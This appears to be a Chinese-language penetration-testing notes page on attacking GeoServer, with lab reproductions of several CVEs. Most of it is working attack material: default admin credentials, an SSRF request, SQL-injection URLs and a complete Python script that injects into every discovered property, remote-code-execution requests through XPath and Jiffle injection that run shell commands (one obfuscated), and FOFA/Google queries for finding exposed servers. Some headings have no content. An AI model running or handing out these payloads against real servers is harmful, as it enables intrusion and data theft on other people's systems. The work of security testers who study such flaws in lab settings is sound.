# 注意：测试完下面一定要看看这篇wp，试试里面的打法

参考wp：[https://blog.csdn.net/baidu_25299117/article/details/140305513](https://blog.csdn.net/baidu_25299117/article/details/140305513)

GeoServer是一款JAVA编写的、开源的、用于共享地理空间数据的软件服务器。

# 弱口令

admin/geoserver
![image](https://github.com/user-attachments/assets/05f3f95b-d5ca-492d-8b25-d478536f3839)


# CVE-2021-40822(SSRF)

影响版本：

GeoServer 2.19.3、2.18.5和2.17.6版本之前



漏洞存在于TestWfsPost接口中。攻击者可以利用`url`参数使服务器向任意URL发送请求。该接口接受以下参数：

- `url`：GeoServer将要发送请求的目标URL

- `body`：要发送的请求体内容。如果此参数为空，GeoServer将发送GET请求；如果包含任何值，则GeoServer将发送POST请求

- `username`：基础认证的用户名（可选）

- `password`：基础认证的密码（可选）



注意：`url`参数中的主机名必须与请求中的`Host`头部值相同，否则GeoServer会返回错误。例如，如果`url`参数中的主机名是`www.baidu.com`，那么请求中的`Host`头部值也必须是`www.baidu.com`。
![image](https://github.com/user-attachments/assets/941df35b-d75e-4f10-a93e-4123d8b7d409)

![image](https://github.com/user-attachments/assets/5f090742-e10e-404e-bb4a-8dc6f03e75ed)



```SQL
POST /geoserver/TestWfsPost HTTP/1.1
Host: www.baidu.com
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

form_hf_0=&url=http://www.baidu.com/geoserver/../&body=testtest&username=admin&password=admin
```




# CVE-2023-43795(SSRF)







# CVE-2023-51444（文件上传）





# CVE-2023-25157(SQL 注入)

## 漏洞概述

在2.22.1和2.21.4之前版本中，在开放地理空间联盟（OGC）标准定义的过滤器和函数表达式中发现了一个SQL注入问题，未经身份验证的攻击者可以利用该漏洞进行SQL注入，执行恶意代码。



## 影响版本

geoserver<2.18.7

2.19.0<=geoserver<2.19.7

2.20.0<=geoserver<2.20.7

2.21.0<=geoserver<2.21.4

2.22.0<=geoserver<2.22.2



## 搜索语法

fofa: icon_hash=“97540678”

google: inurl:“/geoserver/ows?service=wfs”



## 复现步骤

1.访问http://yourip:8080/geoserver进入首页
![image](https://github.com/user-attachments/assets/0fd7715d-3550-4cf9-a7af-ca74877751a3)




2.获取每个功能名称

在进行注入之前，首先要获取地理图层列表信息，这是sql注入payload中的一个必要参数

访问以下url获取：
[http://192.168.43.161:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities](http://192.168.43.161:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities)
![image](https://github.com/user-attachments/assets/a5584879-72f5-4300-b995-44cfb4bee90e)


3.获取功能的属性

将上一步获取的typeName的name属性值拼接到url中，构成url如下：
[http://192.168.43.161:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&maxFeatures=1&outputFormat=json](http://192.168.43.161:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&maxFeatures=1&outputFormat=json)
![image](https://github.com/user-attachments/assets/cea2d033-adda-4e4c-a930-727009929003)


4.构造SQL 注入
Feature type (table) name: vulhub:example
One of attribute from feature type: name
利用这些已知参数，拼接成payload:
[http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true](http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true)



在利用漏洞前，需要目标服务器中存在类型是`PostGIS`的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：

- Workspace name: `vulhub`

- Data store name: `pg`

- Feature type (table) name: `example`

- One of attribute from feature type: `name`

利用这些已知参数，发送如下URL即可触发SQL注入漏洞：

```SQL
http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true
```
![image](https://github.com/user-attachments/assets/b1580495-f374-4310-8785-23ac72e4f19c)



py脚本

```SQL
python CVE-2023-25157.py http://your-ip:8080/geoserver/ows
```


修改PROXY = "[http://127.0.0.1:8080/](http://127.0.0.1:8080/)" if PROXY_ENABLED else None

```SQL
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import xml.etree.ElementTree as ET
import json

# Colored output codes
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
ENDC = '\033[0m'

# Check if the script is run without parameters
if len(sys.argv) == 1:
    print(f"{YELLOW}This script requires a URL parameter.{ENDC}")
    print(f"{YELLOW}Usage: python3 {sys.argv[0]} <URL>{ENDC}")
    sys.exit(1)

# URL and proxy settings
URL = sys.argv[1]
PROXY_ENABLED = False
PROXY = "http://127.0.0.1:8080/" if PROXY_ENABLED else None

response = requests.get(URL + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities",
                        proxies={"http": PROXY}, verify=False)

if response.status_code == 200:

    # Parse the XML response and extract the Name from each FeatureType and store in a list
    root = ET.fromstring(response.text)
    feature_types = root.findall('.//{http://www.opengis.net/wfs}FeatureType')
    names = [feature_type.findtext('{http://www.opengis.net/wfs}Name') for feature_type in feature_types]

    # Print the feature names
    print(f"{GREEN}Available feature names:{ENDC}")
    for name in names:
        print(f"- {name}")

    # Send requests for each feature name and CQL_FILTER type
    cql_filters = [
        "strStartsWith"]  # We can also exploit other filter/functions like "PropertyIsLike", "strEndsWith", "strStartsWith", "FeatureId", "jsonArrayContains", "DWithin" etc.
    for name in names:
        for cql_filter in cql_filters:
            endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&maxFeatures=1&outputFormat=json"
            response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
            if response.status_code == 200:
                json_data = json.loads(response.text)
                try:
                    properties = json_data['features'][0]['properties']
                except  IndexError:
                    print("Error: 超出范围")
                property_names = list(properties.keys())
                print(f"\n{GREEN}Available Properties for {name}:{ENDC}")
                for property_name in property_names:
                    print(f"- {property_name}")

                print(f"\n{YELLOW}Sending requests for each property name:{ENDC}")
                for property_name in property_names:
                    endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&CQL_FILTER={cql_filter}%28{property_name}%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                    response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
                    print(
                        f"[+] Sending request for {BOLD}{name}{ENDC} with Property {BOLD}{property_name}{ENDC} and CQL_FILTER: {BOLD}{cql_filter}{ENDC}")
                    if response.status_code == 200:
                        root = ET.fromstring(response.text)
                        error_message = root.findtext('.//{http://www.opengis.net/ogc}ServiceException')
                        print(f"{GREEN}{error_message}{ENDC}")
                    else:
                        print(f"{RED}Request failed{ENDC}")
            else:
                print(f"{RED}Request failed{ENDC}")
else:
    print(f"{RED}Failed to retrieve XML data{ENDC}")

```




# CVE-2024-36401(远程代码执行漏洞)

## 漏洞原理

GeoServer 是一个开源服务器，允许用户共享和编辑地理空间数据，依赖 GeoTools 库来处理地理空间数据。

GeoServer 调用的 GeoTools 库 API 会以不安全的方式将要素类型的属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此 XPath 评估仅供复杂要素类型（即应用程序架构数据存储）使用，但也被错误地应用于简单要素类型，这使得此漏洞适用于所有GeoServer 实例。

## 影响版本

GeoServer < 2.23.6

2.24.0 <= GeoServer < 2.24.4

2.25.0 <= GeoServer < 2.25.2



## 复现过程

输入 [http://127.0.0.1:8080/geoserver](http://127.0.0.1:8080/geoserver) 进入 GeoServer 的管理员界面。
![image](https://github.com/user-attachments/assets/591c5fbf-89f0-42fc-9e48-172c3858d99f)


网上有很多POC。

### POC 1 GET请求

```SQL
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
```


### POC 2 post请求

```SQL
POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')</wfs:valueReference>
</wfs:GetPropertyValue>
```


熟悉的`java.lang.ClassCastException`错误，说明命令已执行成功。
![image](https://github.com/user-attachments/assets/86cb05de-a664-4a7a-9a43-58bac8c281ca)


进入容器可见，`touch /tmp/success1`与`touch /tmp/success2`均已成功执行。

值得注意的是，***typeNames必须存在***，我们可以在Web页面中找到当前服务器中的所有Types：

```SQL
/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?1&filter=false
```
![image](https://github.com/user-attachments/assets/02febb24-dc4d-40c0-8ddb-acd9a46fd067)





### POC 3 基于时间的测试

如果有人难以重现 CVE-2024-36401，请尝试此有效载荷

```SQL
POST /geoserver/wfs HTTP/1.1
Host: ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 401

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>
/+java.lang.T<!--IgnoreMe!!!!-->hread.s[(: IGNORE :)]leep&#010;&#032;&#009;<![CDATA[
(5000)
]]>
  </wfs:valueReference>
</wfs:GetPropertyValue>
```
![image](https://github.com/user-attachments/assets/c9ef023e-c14a-47d0-9821-edc90468d6cd)



### 工具

工具使用教程：[https://rivers.chaitin.cn/blog/cqjqj6h0lnebepb58k2g](https://rivers.chaitin.cn/blog/cqjqj6h0lnebepb58k2g)

（这块的注入内存马一直卡住）
![image](https://github.com/user-attachments/assets/383eb01b-2e4d-4e27-9799-9b6fa4041068)
![image](https://github.com/user-attachments/assets/8a510c91-31c0-432e-8efc-0bab31a78fdf)


# CVE-2022-24816(远程代码执行漏洞)

## 漏洞概述

GeoServer 使用 JAI-EXT 提供的 Jiffle 地图代数语言，这让使用者可以高效地在大图像上执行地图查询。在 JAI-EXT 1.2.21 及更早版本中存在一个代码注入漏洞（CVE-2022-24816），该漏洞允许攻击者通过精心构造的 Jiffle 调用来执行远程代码。

## 影响版本

```SQL
GeoServer jal-ext <= 1.2.21
```


## 网络测绘

```SQL
app="GeoServer"
```


## 复现过程

漏洞存在于 WMS 接口中。攻击者可以通过向 `/geoserver/wms` 发送特制的请求来执行任意 Java 代码。请求中需要包含一个恶意的 Jiffle 表达式，这个表达式将被服务器执行。

```SQL
<wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
```


```SQL
POST /geoserver/wms/ HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: */*
Content-Length: 44

<?xml version="1.0" encoding="UTF-8"?>
<wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
<ows:Identifier>ras:Jiffle</ows:Identifier>
<wps:DataInputs>
    <wps:Input>
    <ows:Identifier>coverage</ows:Identifier>
    <wps:Data>
        <wps:ComplexData mimeType="application/arcgrid"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>
    </wps:Data>
    </wps:Input>
    <wps:Input>
    <ows:Identifier>script</ows:Identifier>
    <wps:Data>
        <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
    </wps:Data>
    </wps:Input>
    <wps:Input>
    <ows:Identifier>outputType</ows:Identifier>
    <wps:Data>
        <wps:LiteralData>DOUBLE</wps:LiteralData>
    </wps:Data>
    </wps:Input>
</wps:DataInputs>
<wps:ResponseForm>
    <wps:RawDataOutput mimeType="image/tiff">
    <ows:Identifier>result</ows:Identifier>
    </wps:RawDataOutput>
</wps:ResponseForm>
</wps:Execute>
```
![image](https://github.com/user-attachments/assets/9ff42cd7-fc28-48e4-886e-7b527c76d9ec)



# CVE-2024-34696(信息泄漏)

漏洞url：[http://ip:8080/geoserver/rest/about/status](http://38.207.178.98:8080/geoserver/rest/about/status)

泄露环境变量和系统信息

![image](https://github.com/user-attachments/assets/53523c61-aac0-4c93-9094-20556fc523f6)



# 列目录（可以和任意文件读取结合）

各种翻看
![image](https://github.com/user-attachments/assets/933510ef-7112-4ca9-a01c-079fede15219)


# CVE-2023-41877(任意文件读取)

这个payload要自己尝试构造
![image](https://github.com/user-attachments/assets/0d1174af-e098-4850-a98c-bea94dc506e4)


成功读取
![image](https://github.com/user-attachments/assets/ef7d79dd-bb2c-44c8-ba98-9dbb71a5e211)


# 数据库信息泄露（自己翻）
![image](https://github.com/user-attachments/assets/8d86451f-b0fc-4369-997f-56aeed0a9edd)




# CVE-2024-36401（XPath RCE）



